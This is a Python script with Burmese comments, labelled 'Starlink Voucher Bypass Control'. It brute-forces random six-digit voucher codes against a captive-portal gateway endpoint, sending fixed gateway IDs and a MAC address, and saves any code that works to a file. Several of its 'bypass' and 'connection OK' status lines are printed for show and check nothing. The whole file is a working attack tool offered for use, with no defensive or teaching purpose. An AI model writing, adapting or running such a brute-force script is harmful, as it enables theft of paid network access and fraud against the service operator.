import time
import random
import os
import sys
import requests

# အရောင်များ
RED = '\033[91m'      # Fail
GREEN = '\033[92m'    # Success
WHITE = '\033[97m'    # Testing
CYAN = '\033[96m'
YELLOW = '\033[93m'
END = '\033[0m'

url = "http://10.44.77.240:2060/expire_tip"

def start_scanning():
    os.system('clear')
    
    # ၁။ ဗီဒီယိုထဲကလို Menu နဲ့ စာတန်းတွေ တစ်ဆင့်ချင်းပြရန်
    print(f"{CYAN}[+] Starlink Voucher Bypass Control{END}")
    time.sleep(0.5)
    print(f"{WHITE}[+] Range: 000000 - 999999 (Random Mode){END}")
    time.sleep(0.5)
    print(f"{YELLOW}[!] Scanning in progress...{END}\n")
    
    time.sleep(0.8)
    print(f"{CYAN}[+] Checking Bypass...{END}")
    time.sleep(0.8)
    print(f"{WHITE}[+] Connection to Server: {GREEN}OK{END}")
    time.sleep(0.8)
    print(f"{WHITE}[*] Starting Brute-force...{END}\n")
    time.sleep(0.5)

    while True:
        code = str(random.randint(0, 999999)).zfill(6)
        
        # လက်ရှိစမ်းနေတဲ့ code ကို အဖြူရောင်နဲ့ တစ်ကြောင်းတည်းမှာ ပြောင်းနေစေရန်
        sys.stdout.write(f"{WHITE}\r[*] Trying: {code}{END}")
        sys.stdout.flush()
        
        params = {
            'gw_id': '984a6ba4b7ef',
            'gw_sn': 'H1TB01V00212C',
            'gw_address': '192.168.110.1',
            'mac': 'a6:a9:6f:93:0b:bb',
            'voucher': code
        }

        try:
            res = requests.get(url, params=params, timeout=1.5)
            
            # ၂။ မရတဲ့ (Fail) code ကို အနီရောင်စာတန်းနဲ့ အောက်ကို တန်းစီချပေးရန်
            if "failed" in res.text.lower() or "expire" in res.text.lower():
                print(f"\n{RED}Fail Code: {code}{END}")
            
            # ၃။ ရတဲ့ (Success) code ကို အစိမ်းရောင်နဲ့ပြရန်
            elif res.status_code == 200:
                print(f"{GREEN}\n\n[SUCCESS] FOUND VALID VOUCHER: {code}{END}")
                with open("success.txt", "a") as f:
                    f.write(f"Success: {code} | {time.ctime()}\n")
                break
        except:
            # Connection ပြတ်တောက်လျှင်လည်း အနီရောင်နဲ့ပဲပြမည်
            print(f"\n{RED}Error: {code} (Server Timeout){END}")
        
        time.sleep(0.1)

if __name__ == "__main__":
    start_scanning()
